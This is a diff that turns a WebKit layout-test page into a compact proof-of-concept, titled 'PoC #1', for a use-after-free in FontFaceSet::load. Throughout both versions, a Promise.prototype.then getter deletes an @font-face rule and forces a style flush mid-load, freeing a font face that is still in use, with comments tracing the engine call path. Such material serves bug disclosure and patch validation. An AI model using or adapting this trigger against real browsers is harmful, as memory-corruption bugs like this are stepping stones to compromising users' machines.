@@ -1,191 +1,77 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>FontFaceSet::load matchingFaces lifetime validation</title>
-<script>
-// === Logging ===
-const log = (msg) => {
-    const p = document.createElement('pre');
-    p.textContent = msg;
-    document.body.appendChild(p);
-    if (typeof testRunner !== 'undefined' && testRunner.dumpAsText)
-        console.log(msg);
-};
-
-// === Phase markers (for post-mortem analysis) ===
-let phase = 'init';
-
-window.onerror = (msg, src, line) => {
-    log(
-ERROR [${phase}]: ${msg} @ ${src}:${line});
-};
-
-window.addEventListener('unhandledrejection', e => {
-    log(UNHANDLED REJECTION [${phase}]: ${e.reason});
-});
-</script>
-
-<!--
-  Two @font-face rules in the same family so that matchingFacesExcludingPreinstalledFonts
-  returns a Vector with at least two entries. The local() source is used so that the
-  first face can complete synchronously (or fail synchronously on machines without the
-  font) driving the promise-resolve path while the second face is still in-flight.
-
-  Rule 0 (index 0): local() reference – may resolve synchronously.
-  Rule 1 (index 1): data: URL blob – always asynchronous (survives the rebuild).
--->
-<style id="poc-sheet">
+<title>PoC #1 — FontFaceSet::load matchingFaces UAF</title>
+<style id="sheet">
 @font-face {
-    font-family: 'PoCFamily';
+    font-family: 'UafFamily';
     font-weight: 400;
-    /* local() – may complete or fail synchronously, driving setStatus() path */
-    src: local('Arial'), local('Helvetica');
-    unicode-range: U+0041-005A; /* A-Z only, forces per-codepoint matching */
+    src: local('Arial'), local('Helvetica'), local('sans-serif');
+    unicode-range: U+0041-005A;
 }
 @font-face {
-    font-family: 'PoCFamily';
+    font-family: 'UafFamily';
     font-weight: 700;
-    /* data: URI so this face always stays in Loading/Pending state longer */
     src: url('data:font/woff2;base64,d09GMgABAAAAAAIAAA==') format('woff2');
-    unicode-range: U+0061-007A; /* a-z only */
+    unicode-range: U+0061-007A;
 }
 </style>
-
+</head>
+<body>
+<pre id="log"></pre>
 <script>
-// Wait for the document to be fully styled before installing the getter.
-document.addEventListener('DOMContentLoaded', async () => {
-    const sheet = document.getElementById('poc-sheet').sheet;
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
+const sheet = document.getElementById('sheet').sheet;
 
-    // Force initial style resolution so both @font-face rules are CSS-connected
-    // and live in CSSFontFaceSet::m_faces[0..m_facesPartitionIndex).
-    document.body.getBoundingClientRect();
-    phase = 'initial-style-resolved';
-    log([1] Initial style resolved. sheet.cssRules.length = ${sheet.cssRules.length});
+// Force initial style resolution: makes both faces CSS-connected
+document.body.getBoundingClientRect();
+L('[+] Two @font-face rules registered, both CSS-connected');
 
-    // -----------------------------------------------------------------------
-    // Install a temporary 'then' getter on Promise.prototype.
-    // JSC's resolvePromise() reads resolution.then synchronously on the same
-    // stack when the DOMPromiseProxy resolves (via m_readyPromise->resolve()).
-    // This is the re-entrancy window.
-    // -----------------------------------------------------------------------
-    let thenGetterFired = false;
-    let getterRuleCountBefore = -1;
-    let getterRuleCountAfter = -1;
+// ---- Install same-stack thenable getter ----
+// JSC resolvePromise() does: then = resolution.then  (synchronous, observable)
+// This fires during FontFaceSet::completedLoading() -> m_readyPromise->resolve()
+// which is called from CSSFontFace::setStatus(Success) inside FontFaceSet::load().
+const orig = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
+let armed = false;
 
-    const originalThen = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
+Object.defineProperty(Promise.prototype, 'then', {
+    configurable: true,
+    get() {
+        if (armed) {
+            armed = false;
+            L('[+] then getter fired (same stack as FontFaceSet::load)');
 
-    Object.defineProperty(Promise.prototype, 'then', {
-        configurable: true,
-        get() {
-            // Only fire once, and only from the FontFaceSet resolution path.
-            // We identify it by checking that we're inside the load() call below.
-            if (!thenGetterFired && phase === 'inside-load') {
-                thenGetterFired = true;
-                phase = 'then-getter-firing';
-                log([2] Promise.prototype.then getter fired (same-stack, inside FontFaceSet::load resolution));
+            // Step 1: schedule style rebuild by deleting the first @font-face rule
+            try { sheet.deleteRule(0); L('[+] deleteRule(0) done'); }
+            catch(e) { L('[!] deleteRule: ' + e); }
 
-                try {
-                    getterRuleCountBefore = sheet.cssRules.length;
+            // Step 2: force immediate flush
+            // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
+            // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face[0])
+            // face[0] refcount -> 0 -> freed.  matchingFaces[0] now dangling.
+            document.body.getBoundingClientRect();
+            L('[+] getBoundingClientRect() flushed style. face[0] may be freed.');
 
-                    // Remove rule at index 0 (@font-face for 'PoCFamily' weight 400).
-                    // This triggers:
-                    //   CSSStyleSheet::deleteRule(0)
-                    //   -> RuleMutationScope destructor -> didMutateRules()
-                    //   -> Style::Scope::didChangeStyleSheetContents()
-                    //   -> scheduleUpdate(ContentsOrInterpretation)
-                    sheet.deleteRule(0);
-                    log([3] sheet.deleteRule(0) called. cssRules.length now = ${sheet.cssRules.length});
-
-                    // Force immediate style + layout flush.
-                    // This drives:
-                    //   Document::updateStyleIfNeeded()
-                    //   -> Style::Scope::flushPendingUpdate() / updateActiveStyleSheets()
-                    //   -> CSSFontSelector::buildStarted()
-                    //      purges m_cssFontFaceSet, marks CSS-connected faces for removal
-                    //   -> CSSFontSelector::buildCompleted()
-                    //      -> CSSFontFaceSet::remove(face_weight400)
-                    //         *** face_weight400 refcount hits 0 → freed ***
-                    //         (only if nothing else holds a strong ref)
-                    document.body.getBoundingClientRect();
-                    getterRuleCountAfter = sheet.cssRules.length;
-                    log([4] getBoundingClientRect() forced style+layout. cssRules.length = ${getterRuleCountAfter});
-
-                } catch (ex) {
-                    log([!] Exception in then getter: ${ex});
-                }
-
-                phase = 'then-getter-done';
-                // Return the original 'then' so promise machinery continues normally.
-                return originalThen.value;
-            }
-            return originalThen.value;
+            // Step 3: restore so promise machinery doesn't get stuck
+            Object.defineProperty(Promise.prototype, 'then', orig);
         }
-    });
-
-    // -----------------------------------------------------------------------
-    // Call document.fonts.load() with text that spans both unicode-ranges so
-    // matchingFacesExcludingPreinstalledFonts() returns >= 2 faces.
-    // The text 'Aa' covers U+0041 (A, weight 400 face) and U+0061 (a, weight 700 face).
-    // -----------------------------------------------------------------------
-    phase = 'inside-load';
-    log([5] Calling document.fonts.load("400 16px PoCFamily", "Aa"));
-
-    let loadResult;
-    try {
-        // FontFaceSet::load() path:
-        //   1. matchingFacesExcludingPreinstalledFonts -> Vector<ref_wrap<CSSFontFace>> [2 entries]
-        //   2. face[0].load() -> pump(Allow) -> local() source -> setStatus(Success) synchronously
-        //      -> iterateClients -> fontStateChanged -> decrementActiveCount -> completedLoading
-        //         -> m_readyPromise->resolve(*this) -> JSC resolvePromise
-        //            -> resolution.then  ← our getter fires here
-        //               → deleteRule(0) + getBoundingClientRect() → CSSFontFaceSet::remove(face[0])
-        //            ← getter done
-        //   3. Loop continues: face[0].get().sourceCount() / face[0].get().status() → UAF (vulnerable)
-        //                      face[1].get().status() / face[1].get().wrapper()      → may be ok
-        loadResult = await document.fonts.load('400 16px PoCFamily', 'Aa');
-        phase = 'load-resolved';
-        log([6] document.fonts.load resolved with ${loadResult.length} face(s));
-    } catch (ex) {
-        phase = 'load-rejected';
-        log([6] document.fonts.load rejected: ${ex});
-    }
-
-    // -----------------------------------------------------------------------
-    // Cleanup: restore original then descriptor
-    // -----------------------------------------------------------------------
-    Object.defineProperty(Promise.prototype, 'then', originalThen);
-    log([7] Promise.prototype.then getter restored);
-
-    // -----------------------------------------------------------------------
-    // Report
-    // -----------------------------------------------------------------------
-    if (thenGetterFired) {
-        log([8] VALIDATION PATH EXERCISED);
-        log(    then-getter rule count before deleteRule: ${getterRuleCountBefore});
-        log(    then-getter rule count after  deleteRule+flush: ${getterRuleCountAfter});
-        log(    If running under ASAN and vulnerable source: expect heap-use-after-free);
-        log(    above in FontFaceSet::load() loop after face[0] was freed by CSSFontFaceSet::remove());
-        log(    On patched source (Vector<Ref<CSSFontFace>>): PASS - Ref<> keeps face alive);
-    } else {
-        log([8] WARNING: then-getter did not fire - promise resolution was not synchronous);
-        log(    Possible reasons: face did not complete synchronously, or JSC thenable path changed);
-        log(    Try running with a definitely-present local() font or an already-cached data: URL);
-    }
-
-    // Signal WebKit layout test runner
-    if (typeof testRunner !== 'undefined') {
-        testRunner.notifyDone();
+        return orig.value;
     }
 });
 
-if (typeof testRunner !== 'undefined') {
-    testRunner.dumpAsText();
-    testRunner.waitUntilDone();
-}
+L('[+] Calling document.fonts.load (text "Aa" -> two matched faces)');
+armed = true;
+
+document.fonts.load('400 16px UafFamily', 'Aa').then(faces => {
+    L('[+] load() resolved, faces: ' + faces.length);
+    L('[+] If ASAN is active and build is vulnerable, you saw heap-use-after-free above.');
+    L('[+] If no ASAN: silent corruption or crash in FontFaceSet::load() post-loop.');
+}).catch(e => {
+    L('[!] load() rejected: ' + e);
+});
+
+L('[+] document.fonts.load() called (synchronous path may have already triggered getter)');
 </script>
-</head>
-<body>
-<p>fontface-matchingfaces-lifetime-validation</p>
-<p id="status">Running...</p>
 </body>
-</html>
+</html> 
+
